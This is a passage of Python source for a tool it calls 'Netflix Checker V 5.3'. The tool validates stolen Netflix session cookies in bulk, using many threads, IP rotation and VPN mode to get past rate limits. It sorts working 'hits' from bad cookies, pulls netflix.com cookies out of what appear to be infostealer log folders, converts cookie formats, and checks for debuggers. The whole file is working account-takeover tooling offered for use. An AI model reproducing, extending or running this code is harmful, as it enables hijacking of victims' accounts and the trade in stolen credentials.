                            with print_lock:
                                print(colorama.Fore.RED + f"❌ Login failed => {cookie_name}")
                            shutil.move(cookie_path, os.path.join("bad", cookie_name))
                            with network_errors_lock:
                                continuous_network_errors = 0
                            success = True
                        else:
                            plan_details = get_plan_details(resp.text)
                            if not plan_details:
                                plan_details = {
                                    'name': 'Unknown',
                                    'email': 'Unknown',
                                    'country_of_signup': 'Unknown',
                                    'localized_plan_name': 'Unknown',
                                    'video_quality': 'Unknown',
                                    'user_guid': 'Unknown',
                                    'membership_status': 'Unknown',
                                    'membership_ended': False
                                }
                            handle_cookie_placement(
                                plan_details,
                                cookie_name,
                                cookie_path,
                                unique_userguids_map,
                                counts,
                                counts_lock,
                                unique_userguids_lock,
                                raw_content
                            )
                            with network_errors_lock:
                                continuous_network_errors = 0
                            success = True
                        break

                    except requests.exceptions.RequestException as e:
                        with network_errors_lock:
                            continuous_network_errors += 1
                            if continuous_network_errors >= 30:
                                print(colorama.Fore.RED + "Your IP is banned, please connect to VPN. (Continuous Net Errors)")
                        if attempt_num == 3:
                            handle_error(ErrorType.NETWORK, cookie_name, cookie_path, counts, counts_lock, e)
                        else:
                            with print_lock:
                                print(colorama.Fore.YELLOW + f"[WARN] Network error on {cookie_name}, retry {attempt_num}/3")
                        time.sleep(1)

                    except Exception as e:
                        handle_error(ErrorType.UNKNOWN, cookie_name, cookie_path, counts, counts_lock, e)
                        break

                if not success:
                    pass
            except (UnicodeEncodeError, UnicodeDecodeError) as e:
                handle_error(ErrorType.ENCODING, cookie_name, cookie_path, counts, counts_lock, e)
                if os.path.exists(cookie_path):
                    os.remove(cookie_path)
            except ValueError as e:
                handle_error(ErrorType.JSON_DECODE, cookie_name, cookie_path, counts, counts_lock, e)
                if os.path.exists(cookie_path):
                    os.remove(cookie_path)
            except Exception as e:
                handle_error(ErrorType.UNKNOWN, cookie_name, cookie_path, counts, counts_lock, e)
                if os.path.exists(cookie_path):
                    os.remove(cookie_path)
            finally:
                cqueue.task_done()

                if parse_func == parse_netscape_cookie_file:
                    global netscape_request_count, netscape_div950
                    with lock_netscape_count:
                        netscape_request_count += 1
                        c = netscape_request_count
                        do_sleep_3 = (c % 300 == 0)
                        d950 = c // 950
                        do_rotate = (d950 > netscape_div950)
                        if do_rotate:
                            netscape_div950 = d950
                        flush_needed = (c % FLUSH_THRESHOLD == 0)

                    if do_sleep_3:
                        pause_event.set()
                        print(colorama.Fore.YELLOW + f"[INFO] {c} cookie mark => Pausing 3 seconds.")
                        time.sleep(3)
                        print(colorama.Fore.GREEN + "[INFO] Done. Continuing checks...")
                        pause_event.clear()

                    if do_rotate:
                        pause_event.set()
                        print(colorama.Fore.YELLOW + "[INFO] 950 cookie mark => handle rate limit or IP rotation.")
                        handle_rate_limit()
                        pause_event.clear()

                    if flush_needed:
                        partial_flush_network()

                else:
                    global json_request_count, json_div950
                    with lock_json_count:
                        json_request_count += 1
                        c = json_request_count
                        do_sleep_3 = (c % 300 == 0)
                        d950 = c // 950
                        do_rotate = (d950 > json_div950)
                        if do_rotate:
                            json_div950 = d950
                        flush_needed = (c % FLUSH_THRESHOLD == 0)

                    if do_sleep_3:
                        pause_event.set()
                        print(colorama.Fore.YELLOW + f"[INFO] {c} cookie mark => Pausing 3 seconds.")
                        time.sleep(3)
                        print(colorama.Fore.GREEN + "[INFO] Done. Continuing checks...")
                        pause_event.clear()

                    if do_rotate:
                        pause_event.set()
                        print(colorama.Fore.YELLOW + "[INFO] 950 cookie mark => handle rate limit or IP rotation.")
                        handle_rate_limit()
                        pause_event.clear()

                    if flush_needed:
                        partial_flush_network()

    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        for _ in range(num_threads):
            executor.submit(worker)

    cqueue.join()
    delete_empty_subfolders("cookies")

    dispatch_final_stats(counts, start_time, is_json=is_json)

def check_netscape_cookies(num_threads=1):
    do_main_cookie_check(parse_netscape_cookie_file, is_json=False, num_threads=num_threads)

def check_json_cookies(num_threads=1):
    do_main_cookie_check(parse_json_cookie_file, is_json=True, num_threads=num_threads)

def convert_json_to_netscape():
    print(colorama.Fore.MAGENTA + "Converting JSON to Netscape...")

    def bool_to_string(b):
        return "TRUE" if b else "FALSE"

    convert_folder = 'convert'
    converted_folder = 'converted'

    if not os.path.exists(converted_folder):
        os.makedirs(converted_folder)

    for cookie in os.listdir(convert_folder):
        try:
            cookie_path = os.path.join(convert_folder, cookie)
            with open(cookie_path, 'r', encoding='utf-8') as f:
                cookies = json.load(f)
            with open(os.path.join(converted_folder, cookie), 'w', encoding='utf-8') as writef:
                for x in cookies:
                    domain = x.get('domain', '.netflix.com')
                    domain_col = "TRUE" if domain.startswith('.') else "FALSE"
                    path = x.get('path', '/')
                    secure = bool_to_string(x.get('secure', False))
                    expires = x.get('expires', 0)
                    name = x.get('name', '')
                    value = x.get('value', '')
                    writef.write(f"{domain}\t{domain_col}\t{path}\t{secure}\t{expires}\t{name}\t{value}\n")
        except Exception as e:
            print(colorama.Fore.RED + f"Error: {e} with {cookie}")
            continue

    print(colorama.Fore.CYAN + "Completed converting cookies")
    input(colorama.Fore.CYAN + "Press enter to return\n")
    clear_screen()

def convert_netscape_to_json():
    print(colorama.Fore.MAGENTA + "Converting Netscape to JSON...")

    def string_to_bool(s):
        return s.upper() == "TRUE"

    convert_folder = 'convert'
    converted_folder = 'converted'

    if not os.path.exists(converted_folder):
        os.makedirs(converted_folder)

    for cookie in os.listdir(convert_folder):
        try:
            cookie_path = os.path.join(convert_folder, cookie)
            result_cookies = []
            with open(cookie_path, 'r', encoding='utf-8') as f:
                for line in f:
                    if not line.strip() or line.startswith('#'):
                        continue
                    parts = line.strip().split('\t')
                    if len(parts) >= 7:
                        domain, domain_col, path, secure, expires, name, value = parts[:7]
                        cdict = {
                            'domain': domain,
                            'path': path,
                            'secure': string_to_bool(secure),
                            'expires': expires if expires else None,
                            'name': name,
                            'value': value
                        }
                        result_cookies.append(cdict)

            with open(os.path.join(converted_folder, cookie), 'w', encoding='utf-8') as writef:
                json.dump(result_cookies, writef, indent=4)

        except Exception as e:
            print(colorama.Fore.RED + f"Error: {e} with {cookie}")
            continue

    print(colorama.Fore.CYAN + "Completed converting cookies")
    input(colorama.Fore.CYAN + "Press enter to return\n")
    clear_screen()

def transfer_cookies():
    print(colorama.Fore.MAGENTA + "Transferring cookies...")

    def move_or_copy(source, destination, action):
        for root, _, files in os.walk(source):
            for cookie_file in files:
                if cookie_file.endswith('.txt'):
                    source_path = os.path.join(root, cookie_file)
                    dest_path = os.path.join(destination, cookie_file)
                    if action == 'move':
                        shutil.move(source_path, dest_path)
                    elif action == 'copy':
                        shutil.copy(source_path, dest_path)

    action = input(colorama.Fore.CYAN + "Do you want to move or copy cookies? (move/copy): ").strip().lower()
    if action not in ['move', 'copy']:
        print(colorama.Fore.RED + "Invalid action. Please choose 'move' or 'copy'.")
        return

    all_folder = os.path.join("hits", "allhitsfolder")
    os.makedirs(all_folder, exist_ok=True)

    move_or_copy("hits", all_folder, action)

    print(colorama.Fore.CYAN + "Completed transferring cookies")
    input(colorama.Fore.CYAN + "Press enter to return\n")
    clear_screen()

def file_is_cookie(file_path):
    parent = os.path.basename(os.path.dirname(file_path)).lower()
    fname = os.path.basename(file_path).lower()
    return ("cookie" in parent or "cookies" in parent or
            "cookie" in fname or "cookies" in fname)

def remove_exact_duplicate_files(folder_path):
    seen_hashes = {}
    duplicates_removed = 0
    txt_files = [
        os.path.join(folder_path, f)
        for f in os.listdir(folder_path)
        if f.lower().endswith('.txt')
    ]
    for fpath in txt_files:
        try:
            with open(fpath, "rb") as fp:
                content = fp.read()
            file_hash = hashlib.md5(content).hexdigest()
            if file_hash in seen_hashes:
                os.remove(fpath)
                duplicates_removed += 1
            else:
                seen_hashes[file_hash] = fpath
        except Exception as e:
            print(f"[ERROR] Could not process '{fpath}': {e}")
    return duplicates_removed

def extract_nf_cookies_from_logs():
    with print_lock:
        print(colorama.Fore.CYAN + "\n===== Netflix Cookie Extraction from logs =====")

    logs_dir = input(colorama.Fore.CYAN + "Enter the path to the folder containing your logs: ").strip()
    if not os.path.isdir(logs_dir):
        print(colorama.Fore.RED + f"[ERROR] '{logs_dir}' is not a valid directory. Returning to main menu.")
        return

    all_txt_files = []
    for root, dirs, files in os.walk(logs_dir):
        for fname in files:
            if fname.lower().endswith(".txt"):
                full_path = os.path.join(root, fname)
                all_txt_files.append(full_path)

    if not all_txt_files:
        print(colorama.Fore.YELLOW + f"No .txt files found in '{logs_dir}'. Returning to main menu.")
        return

    cookie_files = [fp for fp in all_txt_files if file_is_cookie(fp)]
    if not cookie_files:
        print(colorama.Fore.YELLOW + "[INFO] No cookie-labeled files found. Returning to main menu.")
        return

    print(colorama.Fore.CYAN + f"\n[INFO] Found {len(all_txt_files)} total .txt files, of which {len(cookie_files)} are 'cookie' files.\n")
    print(colorama.Fore.GREEN + "[INFO] Starting concurrent search for 'netflix.com'...")

    keyword = "netflix.com"
    cookies_dir = "cookies"
    os.makedirs(cookies_dir, exist_ok=True)

    file_results = []
    total_files = len(cookie_files)
    done_count = 0

    def search_file_for_keyword(file_path, keyword):
        matched_lines = []
        try:
            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    if keyword in line.lower():
                        matched_lines.append(line.strip('\n'))
        except:
            pass
        return matched_lines

    with ThreadPoolExecutor() as executor:
        future_map = {
            executor.submit(search_file_for_keyword, f, keyword): f
            for f in cookie_files
        }
        for future in as_completed(future_map):
            file_path = future_map[future]
            done_count += 1
            with print_lock:
                print(f"  [Progress] Completed {done_count}/{total_files} file(s)...", end="\r")

            try:
                matched_lines = future.result()
                if matched_lines:
                    file_results.append((file_path, matched_lines))
            except Exception as e:
                with print_lock:
                    print(colorama.Fore.RED + f"\n[ERROR] Exception searching {file_path}: {e}")

    print()
    matched_files_count = 0
    total_lines_matched = 0

    for i, (file_path, matched_lines) in enumerate(file_results, start=1):
        matched_files_count += 1
        total_lines_matched += len(matched_lines)

        out_name = f"extracted_{i}.txt"
        out_path = os.path.join(cookies_dir, out_name)
        try:
            with open(out_path, "w", encoding="utf-8") as out_f:
                for line in matched_lines:
                    out_f.write(line + "\n")
        except Exception as e:
            with print_lock:
                print(colorama.Fore.RED + f"[ERROR] Could not write to '{out_path}': {e}")

    duplicates_removed = remove_exact_duplicate_files(cookies_dir)

    with print_lock:
        print(colorama.Fore.CYAN + "\n===== Netflix Cookie Extraction Summary =====")
        print(colorama.Fore.GREEN + f"Total .txt files scanned: {len(all_txt_files)}")
        print(colorama.Fore.GREEN + f"Files recognized as 'cookie': {len(cookie_files)}")
        print(colorama.Fore.GREEN + f"Files containing '{keyword}': {matched_files_count}")
        print(colorama.Fore.GREEN + f"Total lines matched: {total_lines_matched}")
        print(colorama.Fore.GREEN + f"Exact-duplicate files removed: {duplicates_removed}")
        print(colorama.Fore.GREEN + "-" * 50)

def get_allowed_thread_range(total_cookies):
    thresholds = [(10000, 4), (7000, 5), (4000, 7), (2000, 8)]
    for threshold, max_threads in thresholds:
        if total_cookies >= threshold:
            return 1, max_threads
    return 1, 15

def main():
    detect_debugger()

    directories = ['bad', 'convert', 'converted', 'cookies', 'hits']
    for directory in directories:
        if not os.path.exists(directory):
            os.makedirs(directory)

    if not check_internet_connection():
        print(colorama.Fore.RED + "You are not connected to the internet.")
        input("Connect to the internet and run again. Press Enter to exit...")
        return

    if not is_admin():
        print("Administrator privileges are required to run this script.")
        input("Press Enter to request admin privileges...")
        run_as_admin()
        return

    print_banner()
    info()
    clear_screen()

    global USE_IP_ROTATION
    choice = input("Do you want to enable IP rotation to avoid rate limits? (y/n): ").strip().lower()
    if choice == 'y':
        USE_IP_ROTATION = True

    global ADD_HEADER_FOOTER
    choice = input("Do you want to add header and footer to the cookies? (y/n): ").strip().lower()
    if choice == 'y':
        ADD_HEADER_FOOTER = True

    global VPN_MODE
    override_choice = input("Do you want to override thread mode (VPN mode) => no limit threads (y/n): ").strip().lower()
    if override_choice == 'y':
        VPN_MODE = True

    while True:
        ghosty_banner()
        print("\n" + colorama.Fore.WHITE +
              "\tWelcome to Netflix Checker V 5.3 \n")
        print(colorama.Fore.BLUE + "[1]. Check Netscape Cookies (.txt)")
        print(colorama.Fore.LIGHTBLUE_EX + "[2]. Check JSON Cookies (.json / .txt containing JSON)")
        print(colorama.Fore.GREEN + "[3]. Convert JSON to Netscape")
        print(colorama.Fore.LIGHTGREEN_EX + "[4]. Convert Netscape to JSON")
        print(colorama.Fore.MAGENTA + "[5]. Transfer Cookies (move/copy from hits/ to hits/allhitsfolder)")
        print(colorama.Fore.MAGENTA + "[6]. Extract cookies from logs")
        print(colorama.Fore.RED + "[7]. Exit")

        detect_debugger()
        choice = input(colorama.Fore.CYAN + "\nChoose: ")
        if choice == "1":
            if VPN_MODE:
                while True:
                    try:
                        num_threads = int(input("Enter number of threads (1-30): "))
                        if 1 <= num_threads <= 30:
                            break
                        else:
                            print("Error: Please enter a number between 1 and 30.")
                    except ValueError:
                        print("Error: Invalid input. Please enter a valid integer.")
            else:
                cookie_files = []
                for root, dirs, files in os.walk("cookies"):
                    for file in files:
                        if file.endswith('.txt'):
                            cookie_files.append(os.path.join(root, file))
                total_cookies = len(cookie_files)

                min_threads, max_threads = get_allowed_thread_range(total_cookies)
                print(f"{colorama.Fore.CYAN}Total cookies to check: {total_cookies}{colorama.Style.RESET_ALL}")
                print(f"{colorama.Fore.CYAN}Threads range: {min_threads}-{max_threads}{colorama.Style.RESET_ALL}")
                while True:
                    try:
                        num = int(input(colorama.Fore.CYAN + "Enter number of threads: "))
                        if min_threads <= num <= max_threads:
                            num_threads = num
                            break
                        else:
                            print(colorama.Fore.RED + f"Enter a value between {min_threads} and {max_threads}")
                    except:
                        print(colorama.Fore.RED + "Invalid integer.")

            check_netscape_cookies(num_threads)

        elif choice == "2":
            if VPN_MODE:
                num_threads = 25
            else:
                cookie_files = []
                for root, dirs, files in os.walk("cookies"):
                    for file in files:
                        if file.lower().endswith(".json") or file.lower().endswith(".txt"):
                            cookie_files.append(os.path.join(root, file))
                total_cookies = len(cookie_files)
                if total_cookies == 0:
                    print("No JSON cookies found.")
                    input("Press enter to return.")
                    clear_screen()
                    continue

                min_threads, max_threads = get_allowed_thread_range(total_cookies)
                print(f"Total cookies to check: {total_cookies}")
                print(f"Threads range: {min_threads}-{max_threads}")
                while True:
                    try:
                        num = int(input("Enter number of threads: "))
                        if min_threads <= num <= max_threads:
                            num_threads = num
                            break
                        else:
                            print(f"Enter a value between {min_threads} and {max_threads}")
                    except:
                        print("Invalid integer.")
            check_json_cookies(num_threads)

        elif choice == "3":
            convert_json_to_netscape()

        elif choice == "4":
            convert_netscape_to_json()

        elif choice == "5":
            transfer_cookies()

        elif choice == "6":
            extract_nf_cookies_from_logs()

        elif choice == "7":
            print(colorama.Fore.YELLOW + "Exiting the program. Goodbye!")
            break

        else:
            print(colorama.Fore.RED + "Invalid choice. Please try again.")

if __name__ == "__main__":
    main()
